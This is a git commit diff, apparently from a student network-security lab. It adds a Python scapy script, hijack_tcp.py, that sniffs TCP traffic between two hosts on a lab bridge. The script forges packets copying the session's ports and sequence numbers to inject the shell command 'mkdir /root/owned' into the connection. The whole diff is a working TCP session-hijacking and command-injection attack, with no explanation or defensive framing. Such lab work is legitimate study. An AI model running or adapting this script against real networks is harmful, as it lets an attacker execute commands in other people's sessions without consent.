4186c14277070a8a03253375d0bb4c053a23d25b
Kevin Nanhekhan <k.r.nanhekhan@student.tudelft.nl>
2022-03-11 22:40:49 +0100

    Update hijack_tcp.py

--- transport_layer/hijack_tcp.py
+++ transport_layer/hijack_tcp.py
@@ -1,5 +1,16 @@
 import sys
+from scapy.all import *
 
-if __name__ == "main":
-  src_addr = str(sys.argv[1])
-  dest_addr = str(sys.argv[2])
+def pkt_handler(pkt):
+        if "A" in pkt[TCP].flags:
+                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
+                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
+                command = Raw(load="mkdir /root/owned \n")
+                sendp(ip/tcp/command, iface="br-tcphijack")
+
+if __name__ == "__main__":
+        src_addr = str(sys.argv[1])
+        dst_addr = str(sys.argv[2])
+
+        filter = "tcp and src host {} and dst host {}".format(src_addr, dst_addr)
+        pkt = sniff(iface="br-tcphijack", filter=filter, prn=pkt_handler)
